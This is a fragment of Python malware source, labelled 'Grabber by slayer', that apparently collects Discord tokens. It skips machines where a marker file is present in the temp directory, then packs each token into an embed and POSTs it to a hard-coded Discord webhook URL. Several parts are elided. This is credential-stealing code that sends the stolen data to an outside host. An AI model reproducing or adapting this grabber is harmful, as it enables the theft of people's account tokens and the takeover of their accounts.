...
marker_filename = "IOZGDIZUGígfspíAFG%=.txt"
marker_path = os.path.join(temp_dir, marker_filename)
if os.path.exists(marker_path):
    print("Marker file found. Exiting.")
    exit()
        ...
        for token in gettokens(path):
            ...
            try:
                ...
                embed_user = {
                    ...
                    "username": "Grabber by slayer",
                    "avatar_url": "https://images-ext-1.discordapp.net/external/J89Xf-o94adsehO0zPbOHHJtl-dWZQx--MidHTWGzR0/https/cdn.discordapp.com/avatars/1084370357185675264/9e6d89dc004c1161243829752e912d37.png?format=webp&quality=lossless"
                }

                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1399320913044049921/POBLZX8AI8ESzVnuBmqOBBymCvCpL-ikzRbkPOCqlGy_iABfyQLyBUObZJSqzyuPBdS0', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
